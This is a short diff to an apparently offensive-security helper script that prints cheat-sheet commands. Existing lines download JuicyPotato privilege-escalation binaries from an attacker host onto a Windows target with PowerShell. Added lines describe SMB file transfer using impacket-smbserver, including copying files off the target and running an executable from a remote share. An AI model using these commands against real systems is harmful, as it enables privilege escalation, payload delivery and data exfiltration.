@@ -58,3 +58,14 @@ echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('htt
 echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$ip/JuicyPotato32.exe','C:\\\Users\\\Public\\\Documents\\\JuicyPotato32.exe')"
 echo -e "${Point} Powershell (New-Object System.Net.WebClient).DownloadFile('http://$ip/JuicyPotato64.exe','C:\\\Users\\\Public\\\Documents\\\JuicyPotato64.exe')"
 echo -e ""
+
+
+echo -e "${Frame}###${End} ${Title}Transfer Through SMB Server${End} ${Frame}###${End}"
+echo -e "${Point} impacket-smbserver share ."
+echo -e "    net use * \\\\\\$ip\smb_share"
+echo -e "    copy Z:\\\kali_to_target.exe"
+echo -e "    copy target_to_kali.txt Z:\\"
+echo -e "    \\\\\\10.10.14.23\\\share\\\file.exe ${Comment}# run executable${End}"
+
+
+
